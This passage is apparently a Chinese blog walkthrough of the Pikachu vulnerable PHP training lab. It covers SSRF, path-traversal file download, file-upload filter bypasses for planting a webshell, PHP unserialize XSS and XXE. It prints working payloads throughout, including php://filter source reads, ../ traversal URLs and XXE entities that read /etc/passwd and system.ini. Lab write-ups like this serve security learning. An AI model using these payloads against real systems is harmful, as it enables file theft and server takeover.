> 可以发起内网请求，而不必跳转到另一个服务器，而使用curl则需要跳转
>
> ![img-x8MW1o4h-1602122701627](https://img-blog.csdnimg.cn/20201008103530826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDE3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center)
>
> 除此之外，还可以读取出网页源码，直接使用本题提供的payload
>
> ```
> ?file=php://filter/read=convert.base64-encode/resource=ssrf.php
> ```

另外，这位师傅还总结了php中file_get_contents与curl的区别：

> **1.curl支持更多功能**
> curl支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap;模拟Cookie登录，爬取网页;FTP上传下载。fopen / file_get_contents只能使用GET方式获取数据。
> **2.性能**
> curl可以进行DNS缓存，同一个域名下的图片或其它资源只需要进行一次DNS查询。
> curl相对来说更加快速稳定，访问量高的时候首选curl，缺点就是相对于file_get_contents配置繁琐一点，file_get_contents 适用与处理小访问的应用。

————————————————
https://blog.csdn.net/weixin_44178492/article/details/108959980

# Unsafe Filedownload

**不安全的文件下载**

​	文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。

​	如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。

![image-20230224233143707](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230224233143707.png)

​	查看文件源代码，可知下载提取的目录文件夹是download，通过抓包我们可对get方式传输的payload进行修改，改为：

```
http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../index.html
```

这样就下载到了非预期文件

# Unsafe Upfileupload

**不安全的文件上传漏洞**

​	比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。

​	在设计文件上传功能时，要对传进来的文件进行严格的安全考虑。比如：
--验证文件类型、后缀名、大小;
--验证文件的上传方式;
--对文件进行一定复杂的重命名;
--不要暴露文件上传后的路径;
--等等...

### Client Check

无法上传php文件，

![image-20230225083814828](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225083814828.png)

通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件

![image-20230225084221356](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225084221356.png)

#### 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改

![image-20230225084038804](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225084038804.png)

将此处改为a.php即可，随后蚁剑连接

#### 方法二：浏览器禁用JavaScript

![image-20230225084505282](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225084505282.png)

(Chrome浏览器可以使用JavaScript Switch插件一键禁用)

### MIME type

查看源代码，可知MIME是通过判断你的文件类型(而不是后缀名)来决定是否允许你上传文件，只需抓包修改`content_type`值就能绕过验证
![image-20230225085417114](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225085417114.png)



改为 `Content-Type: image/jpeg`

## getimagesize()验证

`getimagesize()`函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部

可通过制作图片木马或再木马文件内容头部添加`GIF89a`(Gif图片文件头), 然后利用文件包含漏洞来解析图片木马

![image-20230225090103908](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225090103908.png)

![image-20230225085725137](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225085725137.png)

当然也可以直接在一张真正的图片后面插入一句话木马

传入jpg一句话木马，我们再通过文件包含，将jpg进行php渲染，便可以通过蚁剑来连接

# PHP-Unserialize

> 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。

​	于是我向ChatGPT发问

![image-20230225110131173](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225110131173.png)

#### 	序列化serialize()

说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:

```
class S{
    public $test="pikachu";
}
$s=new S(); //创建一个对象
serialize($s); //把这个对象进行序列化
```

	序列化后得到的结果是这个样子的:O:1:"S":1:{s:4:"test";s:7:"pikachu";}
	O:代表object
	1:代表对象名字长度为一个字符
	S:对象的名称
	1:代表对象里面有一个变量
	s:数据类型
	4:变量名称的长度
	test:变量名称
	s:数据类型
	7:变量值的长度
	pikachu:变量值

#### 	反序列化unserialize()

​	就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。

```
$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
echo $u->test; //得到的结果为pikachu
```

​	序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题

#### 	如下所示为常见的魔法函数:

- `__construct()`: 当一个对象创建时被调用

- `__destruct()`: 当一个对象销毁时被调用

- `__toString()`: 当一个对象被当做一个字符串使用

- `__sleep()`: 在对象被序列化之前执行

- `__wakeup()`: 在序列化之后立即被调用

  

```
        漏洞举例:

        class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

查看一下源码：

![image-20230225111614496](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225111614496.png)

根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化)

```
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```



![image-20230225111644762](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225111644762.png)

# Url Redirect

​	不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。
​	如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生"跳错对象"的问题。

​	url跳转比较直接的危害是:
-->钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站

注意查看每个超链接的具体内容：

![image-20230225135150883](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225135150883.png)

尝试跳转至我的博客：

![image-20230225135025502](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225135025502.png)

成功跳转：

![image-20230225135044800](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225135044800.png)

# xml external entity injection

​	xml外部实体注入漏洞

​	攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。

​	在现在很多语言里用于解析xml的函数, 默认禁止解析外部实体内容, 从而就避免了此漏洞。以PHP为例, 在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的

### 	先补一下基础知识：

### [![返回主页](https://www.cnblogs.com/skins/custom/images/logo.gif)](https://www.cnblogs.com/joker-vip/)[joker0xxx3](https://www.cnblogs.com/joker-vip/)师傅的笔记

> #### 第一部分：XML声明部分
>
> ```
> <?xml version="1.0"?>
> ```
>
> #### 第二部分：文档类型定义 DTD
>
> ```
> <!DOCTYPE note[
> <!--定义此文档是note类型的文档-->
> <!ENTITY entity-name SYSTEM "URI/URL">
> <!--外部实体声明-->
> ]>
> ```
>
> ### 第三部分：文档元素
>
> ```
> <note>
> <to>Dave</to>
> <from>Tom</from>
> <head>Reminder</head>
> <body>You are a good man</body>
> </note>
> ```
>
> ​	其中，DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。
>
> ```
> ① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]>
> ② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI">
> ③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI">
> ```
>
> 外部实体引用 Payload
>
> ```
> <?xml version="1.0"?>
> <!DOCTYPE ANY[
> <!ENTITY f SYSTEM "file:///etc/passwd">
> ]>
> <x>&f;</x>
> ```

![AA](https://img2018.cnblogs.com/blog/1675522/201910/1675522-20191008111131980-2107939498.png)

本题目是默认开启了`LIBXML_NOENT`

![image-20230225131958561](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225131958561.png)

如果删掉`LIBXML_NOENT`则无法解析外部实体内容
xml外部引用支持file协议, 以及http, ftp等协议
我们通过构造一下代码，来读取网站根目录的相关文件

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY f SYSTEM "file:///c:/windows/system.ini">
]>
<x>&f;</x>
```

![image-20230225134232978](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230225134232978.png)
